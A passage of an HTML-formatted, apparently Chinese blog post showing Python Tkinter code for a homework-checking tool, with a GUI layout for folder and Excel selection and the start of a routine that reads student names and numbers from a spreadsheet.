self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ex2_button3&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;grid&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;row&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; column&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; padx&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;15&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token comment&#34;&gt;#改名功能&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ex4_label &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Label&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;frame_ex4&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; text&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;格式化命名：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; font&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Verdana&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; width&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;14&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ex4_button1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ttk&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Button&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;frame_ex4&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; text&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;添加文件夹&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;command &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;selectPath1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; width&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ex4_entry1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Entry&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;frame_ex4&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; textvariable &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;path1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; font&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Verdana&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; width&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;21&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ex4_button2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ttk&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Button&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;frame_ex4&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; text&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;添加Excel&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;command &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;selectexcel&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; width&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ex4_entry2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Entry&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;frame_ex4&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; textvariable &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;excel&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; font&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Verdana&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; width&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;21&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ex4_button3 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ttk&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Button&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;frame_ex4&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; text&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;开始&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; command&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;raname_nation&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; width&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ex4_label&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;grid&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;row&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; column&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ex4_button1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;grid&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;row&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; column&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ex4_entry1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;grid&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;row&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; column&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; columnspan&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ex4_button2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;grid&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;row&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; column&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ex4_entry2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;grid&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;row&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; column&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; columnspan&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ex4_button3&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;grid&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;row&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; column&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; padx&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;15&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;54&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;55&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;#grid 方法固定框架&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;56&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;frame_ex0&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;grid&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;row&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; column&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; padx&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; pady&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;57&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;frame_ex2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;grid&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;row&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; column&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; padx&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; pady&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;58&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;frame_ex4&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;grid&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;row&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; column&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; padx&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; pady&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;59&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;60&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;frame_ex0&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;grid_propagate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;61&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;frame_ex2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;grid_propagate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;62&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;frame_ex4&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;grid_propagate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;63&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;64&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;frame_ex0&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;tkraise&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# 开始显示主菜单&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;65&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;frame_ex2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;tkraise&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;66&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;frame_ex4&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;tkraise&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;67&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;68&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;window&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;mainloop&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 进入消息循环&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;查缺功能（主要算法）&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;path &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;path1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token builtin&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;excel&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			wb &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; xlrd&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;open_workbook&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			ws &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; wb&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sheet_by_name&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Sheet1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			data_name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#名字简写&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			data_stunum &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#学号&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			data_fullname &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#全名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			data_total &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#check list&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ws&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;nrows&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#excel 第一列放姓名，第二列放学号&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				data_name&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ws&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;cell_value&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				data_stunum&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span 